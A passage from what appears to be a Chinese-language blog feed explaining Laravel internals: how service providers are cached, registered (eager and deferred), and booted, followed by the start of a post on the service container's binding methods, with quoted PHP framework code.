class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">protected <span class="keyword">function</span> compileManifest(<span class="variable">$providers</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$manifest</span> = <span class="variable">$this</span>-&gt;freshManifest(<span class="variable">$providers</span>);</span><br><span class="line">    foreach (<span class="variable">$providers</span> as <span class="variable">$provider</span>) &#123;</span><br><span class="line">        <span class="variable">$instance</span> = <span class="variable">$this</span>-&gt;createProvider(<span class="variable">$provider</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$instance</span>-&gt;isDeferred()) &#123;</span><br><span class="line">            foreach (<span class="variable">$instance</span>-&gt;provides() as <span class="variable">$service</span>) &#123;</span><br><span class="line">                <span class="variable">$manifest</span>[<span class="string">'deferred'</span>][<span class="variable">$service</span>] = <span class="variable">$provider</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$manifest</span>[<span class="string">'when'</span>][<span class="variable">$provider</span>] = <span class="variable">$instance</span>-&gt;when();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$manifest</span>[<span class="string">'eager'</span>][] = <span class="variable">$provider</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$this</span>-&gt;writeManifest(<span class="variable">$manifest</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">protected <span class="keyword">function</span> freshManifest(array <span class="variable">$providers</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">return</span> [<span class="string">'providers'</span> =&gt; <span class="variable">$providers</span>, <span class="string">'eager'</span> =&gt; [], <span class="string">'deferred'</span> =&gt; []];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>缓存文件中 providers 放入了所有自定义和框架核心的服务。<br>如果服务提供器是需要立即注册的，那么将会放入缓存文件中 eager 数组中。<br>如果服务提供器是延迟加载的，那么其函数 provides() 通常会提供服务别名，这个服务别名通常是向服务容器中注册的别名，别名将会放入缓存文件的 deferred 数组中，与真正要注册的服务提供器组成一个键值对。<br>延迟加载如果由 event 事件激活，那么可以在 when 函数中写入事件类，并写入缓存文件的 when 数组中。<br>生成的缓存文件内容如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">array (</span><br><span class="line">    <span class="string">'providers'</span> =&gt; </span><br><span class="line">    array (</span><br><span class="line">      0 =&gt; <span class="string">'Illuminate\\Auth\\AuthServiceProvider'</span>,</span><br><span class="line">      1 =&gt; <span class="string">'Illuminate\\Broadcasting\\BroadcastServiceProvider'</span>,</span><br><span class="line">      ...</span><br><span class="line">    ),</span><br><span class="line"></span><br><span class="line"><span class="string">'eager'</span> =&gt; </span><br><span class="line">array (</span><br><span class="line">      0 =&gt; <span class="string">'Illuminate\\Auth\\AuthServiceProvider'</span>,</span><br><span class="line">      1 =&gt; <span class="string">'Illuminate\\Cookie\\CookieServiceProvider'</span>,</span><br><span class="line">      ...</span><br><span class="line">    ),</span><br><span class="line"></span><br><span class="line">    <span class="string">'deferred'</span> =&gt; </span><br><span class="line">    array (</span><br><span class="line">      <span class="string">'Illuminate\\Broadcasting\\BroadcastManager'</span> =&gt; <span class="string">'Illuminate\\Broadcasting\\BroadcastServiceProvider'</span>,</span><br><span class="line">      <span class="string">'Illuminate\\Contracts\\Broadcasting\\Factory'</span> =&gt; <span class="string">'Illuminate\\Broadcasting\\BroadcastServiceProvider'</span>,</span><br><span class="line">      ...</span><br><span class="line">    ),</span><br><span class="line"></span><br><span class="line">    <span class="string">'when'</span> =&gt; </span><br><span class="line">    array (</span><br><span class="line">      <span class="string">'Illuminate\\Broadcasting\\BroadcastServiceProvider'</span> =&gt; </span><br><span class="line">      array (</span><br><span class="line">      ),</span><br><span class="line">      ...</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p>事件触发时注册延迟服务提供器<br>延迟服务提供器除了利用 IOC 容器解析服务方式激活，还可以利用 Event 事件来激活：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">protected <span class="keyword">function</span> registerLoadEvents(<span class="variable">$provider</span>, array <span class="variable">$events</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (count(<span class="variable">$events</span>) &lt; 1) &#123;</span><br><span class="line">        <span class="built_in">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$this</span>-&gt;app-&gt;make(<span class="string">'events'</span>)-&gt;listen(<span class="variable">$events</span>, <span class="keyword">function</span> () use (<span class="variable">$provider</span>) &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;app-&gt;register(<span class="variable">$provider</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>即时注册服务提供器<br>需要即时注册的服务提供器的register方法由Application的register方法里来调用：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">class Application extends Container implements ApplicationContract, HttpKernelInterface</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="keyword">function</span> register(<span class="variable">$provider</span>, <span class="variable">$options</span> = [], <span class="variable">$force</span> = <span class="literal">false</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$registered</span> = <span class="variable">$this</span>-&gt;getProvider(<span class="variable">$provider</span>)) &amp;&amp; ! <span class="variable">$force</span>) &#123;</span><br><span class="line">            <span class="built_in">return</span> <span class="variable">$registered</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (is_string(<span class="variable">$provider</span>)) &#123;</span><br><span class="line">            <span class="variable">$provider</span> = <span class="variable">$this</span>-&gt;resolveProvider(<span class="variable">$provider</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (method_exists(<span class="variable">$provider</span>, <span class="string">'register'</span>)) &#123;</span><br><span class="line">            <span class="variable">$provider</span>-&gt;register();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$this</span>-&gt;markAsRegistered(<span class="variable">$provider</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$this</span>-&gt;booted) &#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;bootProvider(<span class="variable">$provider</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$provider</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> getProvider(<span class="variable">$provider</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$name</span> = is_string(<span class="variable">$provider</span>) ? <span class="variable">$provider</span> : get_class(<span class="variable">$provider</span>);</span><br><span class="line">        <span class="built_in">return</span> Arr::first(<span class="variable">$this</span>-&gt;serviceProviders, <span class="keyword">function</span> (<span class="variable">$value</span>) use (<span class="variable">$name</span>) &#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$value</span> instanceof <span class="variable">$name</span>;</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> resolveProvider(<span class="variable">$provider</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        eturn new <span class="variable">$provider</span>(<span class="variable">$this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected <span class="keyword">function</span> markAsRegistered(<span class="variable">$provider</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        //这个属性在稍后booting服务时会用到</span><br><span class="line">        <span class="variable">$this</span>-&gt;serviceProviders[] = <span class="variable">$provider</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;loadedProviders[get_class(<span class="variable">$provider</span>)] = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected <span class="keyword">function</span> bootProvider(ServiceProvider <span class="variable">$provider</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (method_exists(<span class="variable">$provider</span>, <span class="string">'boot'</span>)) &#123;</span><br><span class="line">            <span class="built_in">return</span> <span class="variable">$this</span>-&gt;call([<span class="variable">$provider</span>, <span class="string">'boot'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看出，服务提供器的注册过程：</p><p>判断当前服务提供器是否被注册过，如注册过直接返回对象<br>解析服务提供器<br>调用服务提供器的 register 函数<br>标记当前服务提供器已经注册完毕<br>若框架已经加载注册完毕所有的服务容器，那么就启动服务提供器的 boot 函数，该函数由于是 call 调用，所以支持依赖注入。<br>服务解析时注册延迟服务提供器<br>延迟服务提供器首先需要添加到 Application 中<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">function</span> addDeferredServices(array <span class="variable">$services</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$this</span>-&gt;deferredServices = array_merge(<span class="variable">$this</span>-&gt;deferredServices, <span class="variable">$services</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们之前说过，延迟服务提供器的激活注册有两种方法：事件与服务解析。</p><p>当特定的事件被激发后，就会调用 Application 的 register 函数，进而调用服务提供器的 register 函数，实现服务的注册。</p><p>当利用 Ioc 容器解析服务名时，例如解析服务名 BroadcastingFactory：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">class BroadcastServiceProvider extends ServiceProvider</span><br><span class="line">&#123;</span><br><span class="line">    protected <span class="variable">$defer</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> provides()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">return</span> [</span><br><span class="line">            BroadcastManager::class,</span><br><span class="line">            BroadcastingFactory::class,</span><br><span class="line">            BroadcasterContract::class,</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在Application的make方法里会通过别名BroadcastingFactory查找是否有对应的延迟注册的服务提供器，如果有的话那么 就先通过registerDeferredProvider方法注册服务提供器。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">class Application extends Container implements ApplicationContract, HttpKernelInterface</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="keyword">function</span> make(<span class="variable">$abstract</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$abstract</span> = <span class="variable">$this</span>-&gt;getAlias(<span class="variable">$abstract</span>);</span><br><span class="line">        <span class="keyword">if</span> (isset(<span class="variable">$this</span>-&gt;deferredServices[<span class="variable">$abstract</span>])) &#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;loadDeferredProvider(<span class="variable">$abstract</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">return</span> parent::make(<span class="variable">$abstract</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> loadDeferredProvider(<span class="variable">$service</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (! isset(<span class="variable">$this</span>-&gt;deferredServices[<span class="variable">$service</span>])) &#123;</span><br><span class="line">            <span class="built_in">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="variable">$provider</span> = <span class="variable">$this</span>-&gt;deferredServices[<span class="variable">$service</span>];</span><br><span class="line">        <span class="keyword">if</span> (! isset(<span class="variable">$this</span>-&gt;loadedProviders[<span class="variable">$provider</span>])) &#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;registerDeferredProvider(<span class="variable">$provider</span>, <span class="variable">$service</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>由 deferredServices 数组可以得知，BroadcastingFactory 为延迟服务，接着程序会利用函数 loadDeferredProvider 来加载延迟服务提供器，调用服务提供器的 register 函数，若当前的框架还未注册完全部服务。那么将会放入服务启动的回调函数中，以待服务启动时调用：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">public <span class="keyword">function</span> registerDeferredProvider(<span class="variable">$provider</span>, <span class="variable">$service</span> = null)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$service</span>) &#123;</span><br><span class="line">        <span class="built_in">unset</span>(<span class="variable">$this</span>-&gt;deferredServices[<span class="variable">$service</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$this</span>-&gt;register(<span class="variable">$instance</span> = new <span class="variable">$provider</span>(<span class="variable">$this</span>));</span><br><span class="line">    <span class="keyword">if</span> (! <span class="variable">$this</span>-&gt;booted) &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;booting(<span class="keyword">function</span> () use (<span class="variable">$instance</span>) &#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;bootProvider(<span class="variable">$instance</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>还是拿服务提供器BroadcastServiceProvider来举例：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">class BroadcastServiceProvider extends ServiceProvider</span><br><span class="line">&#123;</span><br><span class="line">    protected <span class="variable">$defer</span> = <span class="literal">true</span>;</span><br><span class="line">    public <span class="keyword">function</span> register()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;app-&gt;singleton(BroadcastManager::class, <span class="keyword">function</span> (<span class="variable">$app</span>) &#123;</span><br><span class="line">            <span class="built_in">return</span> new BroadcastManager(<span class="variable">$app</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="variable">$this</span>-&gt;app-&gt;singleton(BroadcasterContract::class, <span class="keyword">function</span> (<span class="variable">$app</span>) &#123;</span><br><span class="line">            <span class="built_in">return</span> <span class="variable">$app</span>-&gt;make(BroadcastManager::class)-&gt;connection();</span><br><span class="line">        &#125;);</span><br><span class="line">        //将BroadcastingFactory::class设置为BroadcastManager::class的别名</span><br><span class="line">        <span class="variable">$this</span>-&gt;app-&gt;<span class="built_in">alias</span>(</span><br><span class="line">            BroadcastManager::class, BroadcastingFactory::class</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> provides()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">return</span> [</span><br><span class="line">            BroadcastManager::class,</span><br><span class="line">            BroadcastingFactory::class,</span><br><span class="line">            BroadcasterContract::class,</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>函数 register 为类 BroadcastingFactory 向 服务容器绑定了特定的实现类 BroadcastManager，Application中的 make 函数里执行parent::make($abstract) 通过服务容器的make就会正确的解析出服务 BroadcastingFactory。</p><p>因此函数 provides() 返回的元素一定都是 register() 向 服务容器中绑定的类名或者别名。这样当我们利用App::make() 解析这些类名的时候，服务容器才会根据服务提供器的 register() 函数中绑定的实现类，正确解析出服务功能。</p><p>启动Application</p><p>Application的启动由类 \Illuminate\Foundation\Bootstrap\BootProviders 负责：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">class BootProviders</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="keyword">function</span> bootstrap(Application <span class="variable">$app</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$app</span>-&gt;boot();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Application extends Container implements ApplicationContract, HttpKernelInterface</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="keyword">function</span> boot()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$this</span>-&gt;booted) &#123;</span><br><span class="line">            <span class="built_in">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$this</span>-&gt;fireAppCallbacks(<span class="variable">$this</span>-&gt;bootingCallbacks);</span><br><span class="line">        array_walk(<span class="variable">$this</span>-&gt;serviceProviders, <span class="keyword">function</span> (<span class="variable">$p</span>) &#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;bootProvider(<span class="variable">$p</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="variable">$this</span>-&gt;booted = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;fireAppCallbacks(<span class="variable">$this</span>-&gt;bootedCallbacks);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    protected <span class="keyword">function</span> bootProvider(ServiceProvider <span class="variable">$provider</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (method_exists(<span class="variable">$provider</span>, <span class="string">'boot'</span>)) &#123;</span><br><span class="line">            <span class="built_in">return</span> <span class="variable">$this</span>-&gt;call([<span class="variable">$provider</span>, <span class="string">'boot'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>引导应用Application的serviceProviders属性中记录的所有服务提供器，就是依次调用这些服务提供器的boot方法，引导完成后$this-&gt;booted = true 就代表应用Application正式启动了，可以开始处理请求了。这里额外说一句，之所以等到所有服务提供器都注册完后再来进行引导是因为有可能在一个服务提供器的boot方法里调用了其他服务提供器注册的服务，所以需要等到所有即时注册的服务提供器都register完成后再来boot。</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>laravel学习之服务容器</title>
      <link href="/2018/10/09/laravel%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%9C%8D%E5%8A%A1%E5%AE%B9%E5%99%A8/"/>
      <url>/2018/10/09/laravel%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%9C%8D%E5%8A%A1%E5%AE%B9%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<p>在Laravel框架中，什么设计是最巧妙，那么一定是服务容器和服务和服务提供者。<br><a id="more"></a></p><p>Laravel之所以能够具备低耦合，易扩展和可重用的优秀特性，也正是因为服务容器和服务服务提供者。服务容器中有两个概念控制反转(IOC)和依赖注入(DI):，在之前的系列文章我们已经简单提过了</p><p><img src="服务容器.png" alt="服务容器流程"></p><p>在Laravel中框架把自带的各种服务绑定到服务容器，我们也可以绑定自定义服务到容器。当应用程序需要使用某一个服务时，服务容器会讲服务解析出来同时自动解决服务之间的依赖然后交给应用程序使用。</p><p>从图中我们可以看到最主要的就是服务绑定和服务解析了。</p><h1 id="服务绑定"><a href="#服务绑定" class="headerlink" title="服务绑定"></a>服务绑定</h1><p>常用的绑定服务到容器的方法有instance, bind, singleton, alias。</p><h2 id="instance"><a href="#instance" class="headerlink" title="instance"></a>instance</h2><p>将一个已存在的对象绑定到服务容器里，随后通过名称解析该服务时，容器将总返回这个绑定的实例。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$api</span> = new HelpSpot\API(new HttpClient);</span><br><span class="line"><span class="variable">$this</span>-&gt;app-&gt;instance(<span class="string">'HelpSpot\Api'</span>, <span class="variable">$api</span>);</span><br></pre></td></tr></table></figure><h2 id="bind"><a href="#bind" class="headerlink" title="bind"></a>bind</h2><p>绑定服务到服务容器</p><p>有三种绑定方式:</p><h3 id="绑定自身"><a href="#绑定自身" class="headerlink" title="绑定自身"></a>绑定自身</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$this</span>-&gt;app-&gt;<span class="built_in">bind</span>(<span class="string">'HelpSpot\API'</span>, null);</span><br></pre></td></tr></table></figure><h3 id="绑定闭包"><a href="#绑定闭包" class="headerlink" title="绑定闭包"></a>绑定闭包</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$this</span>-&gt;app-&gt;<span class="built_in">bind</span>(<span class="string">'HelpSpot\API'</span>, <span class="function"><span class="title">function</span></span> () &#123;</span><br><span class="line"><span class="built_in">return</span> new HelpSpot\API();</span><br><span class="line">&#125;);//闭包直接提供类实现方式</span><br><span class="line"><span class="variable">$this</span>-&gt;app-&gt;<span class="built_in">bind</span>(<span class="string">'HelpSpot\API'</span>, <span class="keyword">function</span> (<span class="variable">$app</span>) &#123;</span><br><span class="line"><span class="built_in">return</span> new HelpSpot\API(<span class="variable">$app</span>-&gt;make(<span class="string">'HttpClient'</span>));</span><br><span class="line">&#125;);//闭包返回需要依赖注入的类</span><br></pre></td></tr></table></figure><h3 id="绑定接口和实现"><a href="#绑定接口和实现" class="headerlink" title="绑定接口和实现"></a>绑定接口和实现</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$this</span>-&gt;app-&gt;<span class="built_in">bind</span>(<span class="string">'Illuminate\Tests\Container\IContainerContractStub'</span>, <span class="string">'Illuminate\Tests\Container\ContainerImplementationStub'</span>);</span><br></pre></td></tr></table></figure><p>针对第一种情况，其实在bind方法内部会在绑定服务之前通过getClosure()为服务生成闭包，我们来看一下bind方法源码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">function</span> <span class="built_in">bind</span>(<span class="variable">$abstract</span>, <span class="variable">$concrete</span> = null, <span class="variable">$shared</span> = <span class="literal">false</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$abstract</span> = <span class="variable">$this</span>-&gt;normalize(<span class="variable">$abstract</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$concrete</span> = <span class="variable">$this</span>-&gt;normalize(<span class="variable">$concrete</span>);</span><br><span class="line">    //如果<span class="variable">$abstract</span>为数组类似[<span class="string">'Illuminate/ServiceName'</span> =&gt; <span class="string">'service_alias'</span>]</span><br><span class="line">    //抽取别名<span class="string">"service_alias"</span>并且注册到<span class="variable">$aliases</span>[]中</span><br><span class="line">    //注意：数组绑定别名的方式在5.4中被移除，别名绑定请使用下面的<span class="built_in">alias</span>方法</span><br><span class="line">    <span class="keyword">if</span> (is_array(<span class="variable">$abstract</span>)) &#123;</span><br><span class="line">        list(<span class="variable">$abstract</span>, <span class="variable">$alias</span>) = <span class="variable">$this</span>-&gt;extractAlias(<span class="variable">$abstract</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$this</span>-&gt;<span class="built_in">alias</span>(<span class="variable">$abstract</span>, <span class="variable">$alias</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$this</span>-&gt;dropStaleInstances(<span class="variable">$abstract</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_null(<span class="variable">$concrete</span>)) &#123;</span><br><span class="line">        <span class="variable">$concrete</span> = <span class="variable">$abstract</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    //如果只提供<span class="variable">$abstract</span>，则在这里为其生成concrete闭包</span><br><span class="line">    <span class="keyword">if</span> (! <span class="variable">$concrete</span> instanceof Closure) &#123;</span><br><span class="line">        <span class="variable">$concrete</span> = <span class="variable">$this</span>-&gt;getClosure(<span class="variable">$abstract</span>, <span class="variable">$concrete</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$this</span>-&gt;bindings[<span class="variable">$abstract</span>] = compact(<span class="string">'concrete'</span>, <span class="string">'shared'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$this</span>-&gt;resolved(<span class="variable">$abstract</span>)) &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;rebound(<span class="variable">$abstract</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">protected <span class="keyword">function</span> getClosure(<span class="variable">$abstract</span>, <span class="variable">$concrete</span>)</span><br><span class="line">&#123;</span><br><span class="line">    // <span class="variable">$c</span> 就是<span class="variable">$container</span>，即服务容器，会在回调时传递给这个变量</span><br><span class="line">    <span 